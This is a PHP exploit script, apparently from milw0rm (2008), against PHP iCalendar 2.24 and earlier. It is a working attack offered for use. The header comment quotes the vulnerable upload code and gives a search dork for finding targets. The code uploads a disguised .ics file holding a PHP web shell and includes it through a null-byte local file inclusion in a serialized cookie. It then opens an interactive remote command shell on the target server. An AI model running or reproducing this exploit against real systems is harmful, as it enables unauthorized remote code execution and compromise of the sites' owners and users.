<?php

/*
	-----------------------------------------------------------------
	PHP iCalendar <= 2.24 (cookie_language) LFI / File Upload Exploit
	-----------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://phpicalendar.net/
	dork.....: "Powered by PHP iCalendar"
	
	[-] vulnerable code in /admin/index.php
	
	65.	// Add or Update a calendar
	66.	$addupdate_msg 	= '';
	67.	if ((isset($_POST['action']))  && ($_POST['action'] == 'addupdate')) {
	68.		for ($filenumber = 1; $filenumber < 6; $filenumber++) {
	69.			$file = $_FILES['calfile'];
	70.			$addupdate_success = FALSE;
	71.	
	72.			if (!is_uploaded_file_v4($file['tmp_name'][$filenumber])) {
	73.				$upload_error = get_upload_error($file['error'][$filenumber]);
	74.			} elseif (!is_uploaded_ics($file['name'][$filenumber])) {
	75.				$upload_error = $upload_error_type_lang;
	76.			} elseif (!copy_cal($file['tmp_name'][$filenumber], $file['name'][$filenumber])) {
	77.				$upload_error = $copy_error_lang . " " . $file['tmp_name'][$filenumber] . " - " . $calendar_path . "/" . $file['name'][$filenumber];
	78.			} else {
	79.				$addupdate_success = TRUE;
	80.			}
	81.			
	82.			if ($addupdate_success == TRUE) {
	83.				$addupdate_msg = $addupdate_msg . '<font color="green">'.$lang['l_cal_file'].' #'.$filenumber.': '.$lang['l_action_success'].'</font><br />';
	84.			} else {
	85.				$addupdate_msg = $addupdate_msg . '<font color="red">'.$lang['l_cal_file'].' #'.$filenumber.': '.$lang['l_upload_error'].'</font><br />';
	86.			}
	87.		}
	88.	}
	
	restricted access to this script isn't properly realized, so an attacker might be able to upload a calendar file
	(with .ics extension) into /calendars directory...multiple file extensions isn't checked, but 'ics' is generally
	recognized as text/calendar MIME type by most servers...so this poc try to include the uploaded file using the
	same LFI bug found by rgod (http://retrogod.altervista.org/phpical_221_incl_xpl.html), that isn't still patched!
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

define(STDIN, fopen("php://stdin", "r"));

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

print "\n+---------------------------------------------------------------------------+";
print "\n| PHP iCalendar <= 2.24 (cookie_language) LFI / File Upload Exploit by EgiX |";
print "\n+---------------------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage......: php $argv[0] host path\n";
	print "\nExample....: php $argv[0] localhost /";
	print "\nExample....: php $argv[0] localhost /phpicalendar/\n";
	die();
}

$host = $argv[1];
$path = $argv[2];

$payload  = "--o0oOo0o\r\n";
$payload .= "Content-Disposition: form-data; name=\"action\"\r\n\r\n";
$payload .= "addupdate\r\n";
$payload .= "--o0oOo0o\r\n";
$payload .= "Content-Disposition: form-data; name=\"calfile[1]\"; filename=\"fake_cal.ics\"\r\n\r\n";
$payload .= "BEGIN:VCALENDAR\n<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${die()} ?>\r\n";
$payload .= "--o0oOo0o--\r\n";

$packet   = "POST {$path}admin/index.php HTTP/1.0\r\n";
$packet  .= "Host: {$host}\r\n";
$packet  .= "Content-Length: ".strlen($payload)."\r\n";
$packet  .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
$packet  .= "Connection: close\r\n\r\n";
$packet  .= $payload;
	
http_send($host, $packet);

$packet  = "GET {$path}preferences.php?action=setcookie HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Connection: close\r\n\r\n";

preg_match("/Set-Cookie: (phpicalendar_[^=]*)=/", http_send($host, $packet), $cookie);

$data = urlencode(serialize(array("cookie_language" => "../calendars/fake_cal.ics".chr(0))));

while(1)
{
	print "\nphpicalendar-shell# ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$packet  = "GET {$path}print.php HTTP/1.0\r\n";
		$packet .= "Host: {$host}\r\n";
		$packet .= "Cookie: {$cookie[1]}={$data}\r\n";
		$packet .= "Cmd: ".base64_encode($cmd)."\r\n";
		$packet .= "Connection: close\r\n\r\n";
		$output  = http_send($host, $packet);
		$shell   = explode("_code_", $output);
		preg_match("/_code_/", $output) ? print "\n{$shell[1]}" : die("\n[-] Exploit failed...\n");
	}
	else break;
}

?>

# milw0rm.com [2008-09-21]
